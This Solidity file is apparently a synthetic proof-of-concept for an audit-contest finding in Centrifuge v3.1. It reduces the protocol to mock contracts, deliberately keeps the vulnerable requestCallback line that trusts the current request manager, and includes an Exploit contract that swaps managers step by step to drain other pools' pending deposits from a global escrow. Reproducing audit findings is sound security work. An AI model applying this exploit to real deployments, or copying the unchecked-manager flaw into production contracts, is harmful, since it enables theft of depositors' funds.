// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Centrifuge v3.1 — Pool managers steal other pools' pending deposits
    via malicious requestManager swap
    (Sherlock 2025-10-centrifuge, finding #64195, H-1)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Spoke.requestCallback() uses the CURRENT requestManager[poolId]
    without verifying it is the same manager that created the request. An
    attacker creates fraudulent deposit requests with a malicious manager,
    swaps to AsyncRequestManager, then triggers approvedDeposits which pulls
    legitimate user funds from globalEscrow into the attacker's pool escrow.

    Vulnerable line preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Global escrow holds all pending deposits across pools.
contract GlobalEscrow {
    MockToken public immutable asset;
    address public auth; // AsyncRequestManager

    constructor(MockToken a) {
        asset = a;
    }

    function setAuth(address a) external {
        require(auth == address(0), "set");
        auth = a;
    }

    function authTransferTo(address to, uint256 amount) external {
        require(msg.sender == auth, "not auth");
        require(asset.transfer(to, amount), "xfer");
    }
}

interface IRequestManager {
    function callback(uint256 poolId, bytes calldata payload) external;
}

/// @dev AsyncRequestManager — on approvedDeposits, moves funds from globalEscrow
///      to the pool's escrow (the attacker's pool in the exploit).
contract AsyncRequestManager is IRequestManager {
    GlobalEscrow public immutable globalEscrow;
    mapping(uint256 => address) public poolEscrow; // poolId => escrow recipient

    constructor(GlobalEscrow g) {
        globalEscrow = g;
    }

    function setPoolEscrow(uint256 poolId, address esc) external {
        poolEscrow[poolId] = esc;
    }

    function callback(uint256 poolId, bytes calldata payload) external {
        // payload = abi.encode(assetAmount) for approvedDeposits
        uint256 assetAmount = abi.decode(payload, (uint256));
        approvedDeposits(poolId, assetAmount);
    }

    function approvedDeposits(uint256 poolId, uint256 assetAmount) public {
        address esc = poolEscrow[poolId];
        require(esc != address(0), "no escrow");
        // Note deposit and transfer from global escrow into the pool escrow
        globalEscrow.authTransferTo(esc, assetAmount);
    }
}

/// @dev Malicious request manager: creates fraudulent deposit requests.
contract MaliciousRequestManager is IRequestManager {
    Spoke public spoke;
    uint256 public poolId;
    uint256 public stolenAmount;

    constructor(Spoke _spoke, uint256 _poolId) {
        spoke = _spoke;
        poolId = _poolId;
    }

    function createFraudulentDeposit(uint256 amount) external {
        stolenAmount = amount;
        // payload encodes the fraudulent deposit amount the attacker will later "approve"
        bytes memory payload = abi.encode(amount);
        spoke.request(poolId, payload);
    }

    function callback(uint256, bytes calldata) external pure {
        revert("malicious should not receive callback");
    }
}

/// @notice Reduced Spoke — requestCallback trusts CURRENT requestManager.
contract Spoke {
    mapping(uint256 => address) public requestManager;
    address public hubAuth; // who may set managers / fire callbacks

    error InvalidRequestManager();
    error NotAuthorized();

    function setHubAuth(address a) external {
        require(hubAuth == address(0), "set");
        hubAuth = a;
    }

    function setRequestManager(uint256 poolId, address manager) external {
        require(msg.sender == hubAuth, "not hub");
        requestManager[poolId] = manager;
    }

    function request(uint256 poolId, bytes memory payload) external {
        address manager = requestManager[poolId];
        require(manager != address(0), "no mgr");
        require(msg.sender == manager, "NotAuthorized");
        // Real code relays to hub via gateway; here we just record that a
        // request was authorized. The fraudulent amount lives in payload.
        payload; // accepted
    }

    // ============================================================
    //  Vulnerable requestCallback — Spoke.sol L340-L345
    // ============================================================
    function requestCallback(uint256 poolId, bytes memory payload) external {
        require(msg.sender == hubAuth, "auth");
        // Uses CURRENT requestManager without checking it is the same manager
        // that created the request. Attacker can create a request with a
        // malicious manager, swap to AsyncRequestManager, then receive the
        // approvedDeposits callback that drains globalEscrow.
        // FIX: bind the manager at request time and require equality on callback.
        address manager = requestManager[poolId]; // @> VULN: current manager, not request creator
        require(manager != address(0), "InvalidRequestManager");
        IRequestManager(manager).callback(poolId, payload);
    }
}

/// @dev Hub-side pool manager authority (attacker controls their own pool).
contract HubAuth {
    Spoke public immutable spoke;

    constructor(Spoke s) {
        spoke = s;
    }

    function setRequestManager(uint256 poolId, address manager) external {
        // In real code _isManager(poolId) — attacker is manager of their pool.
        spoke.setRequestManager(poolId, manager);
    }

    function fireApprovedDeposits(uint256 poolId, uint256 amount) external {
        // Simulates hub approving deposits and calling spoke.requestCallback.
        spoke.requestCallback(poolId, abi.encode(amount));
    }
}

/// @dev CREATE order:
///      1 MockToken, 2 GlobalEscrow, 3 AsyncRequestManager, 4 Spoke,
///      5 HubAuth, 6 MaliciousRequestManager (created in run? or constructor)
/// Keep malicious deploy in constructor for stable nonces:
///      1 tok, 2 globalEscrow, 3 asyncMgr, 4 spoke, 5 hub, 6 malicious, 7 attackerEscrow (EOA via address)
contract Exploit {
    uint256 public constant POOL_A = 1; // legitimate remote pool (funds in globalEscrow)
    uint256 public constant ATTACKER_POOL = 999;
    uint256 public constant DEPOSIT = 1000e6;

    MockToken public tok; // nonce 1
    GlobalEscrow public globalEscrow; // nonce 2
    AsyncRequestManager public asyncMgr; // nonce 3
    Spoke public spoke; // nonce 4 — vulnerable
    HubAuth public hub; // nonce 5
    MaliciousRequestManager public malicious; // nonce 6
    address public attackerEscrow; // = address(this) holds stolen funds

    constructor() {
        tok = new MockToken();
        globalEscrow = new GlobalEscrow(tok);
        asyncMgr = new AsyncRequestManager(globalEscrow);
        spoke = new Spoke();
        hub = new HubAuth(spoke);
        malicious = new MaliciousRequestManager(spoke, ATTACKER_POOL);

        spoke.setHubAuth(address(hub));
        globalEscrow.setAuth(address(asyncMgr));

        // Attacker pool escrow = this contract (receives stolen funds).
        attackerEscrow = address(this);
        asyncMgr.setPoolEscrow(ATTACKER_POOL, attackerEscrow);

        // Legitimate investor deposits land in globalEscrow (remote pool path).
        tok.mint(address(globalEscrow), DEPOSIT);
    }

    function run() external {
        require(tok.balanceOf(address(globalEscrow)) == DEPOSIT, "escrow funded");
        require(tok.balanceOf(attackerEscrow) == 0, "attacker empty");

        // 1) Attacker sets malicious request manager on their pool.
        hub.setRequestManager(ATTACKER_POOL, address(malicious));

        // 2) Malicious manager creates fraudulent deposit request (passes auth).
        malicious.createFraudulentDeposit(DEPOSIT);

        // 3) Attacker swaps request manager to AsyncRequestManager.
        hub.setRequestManager(ATTACKER_POOL, address(asyncMgr));

        // 4) Attacker (as pool manager) triggers approveDeposits callback.
        //    requestCallback uses CURRENT manager = AsyncRequestManager.
        hub.fireApprovedDeposits(ATTACKER_POOL, DEPOSIT);

        // HARM: legitimate pending deposits stolen from globalEscrow to attacker.
        require(tok.balanceOf(attackerEscrow) == DEPOSIT, "harm not demonstrated: no theft");
        require(tok.balanceOf(address(globalEscrow)) == 0, "escrow should be empty");
    }
}
